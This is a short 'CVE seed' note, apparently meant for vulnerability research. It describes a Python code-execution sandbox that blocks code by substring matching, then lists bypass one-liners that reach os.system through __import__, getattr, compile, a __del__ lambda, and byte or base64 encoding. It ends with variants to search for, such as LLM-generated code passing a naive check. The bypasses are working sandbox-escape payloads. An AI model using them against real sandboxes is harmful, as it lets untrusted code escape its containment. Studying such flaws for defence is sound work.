# CVE Seed: Code Execution Sandbox Blocklist Bypass

## Vulnerable Pattern
```python
BLOCKED = ["import os", "import subprocess", "import sys", "exec(", "eval("]

def run_sandbox(code):
    for pattern in BLOCKED:
        if pattern in code:
            raise SecurityError(f"Blocked: {pattern}")
    exec(code)  # executes if no pattern matched
```

## Bypass Techniques
```python
# Bypasses "import os":
from os import system
__import__('os').system('whoami')
importlib.import_module('os')
getattr(__builtins__, '__import__')('os')

# Bypasses "exec(":
eval(compile('import os', '<x>', 'exec'))
(lambda: __import__('os').system('id'))()
type('', (), {'__del__': lambda s: __import__('os').system('id')})()

# Bypasses via encoding:
exec(bytes([105,109,112,111,114,116,32,111,115]).decode())
exec(__import__('base64').b64decode(b'aW1wb3J0IG9z').decode())
```

## Structural Pattern
```
CODE_INPUT(llm_generated_or_user_influenced) → CHECK(string_match_blocklist) → EXEC(code_execution)
WHERE blocklist uses substring matching (not AST analysis)
```

## Variants to Search For
- Any code execution sandbox using string-match denylist
- Blocklist that checks generated code but NOT preamble/setup code
- eval/exec protected by pattern matching rather than AST parsing
- Python code interpreter with boto3/requests pre-loaded in namespace
- LLM-generated code that passes through a naive safety check
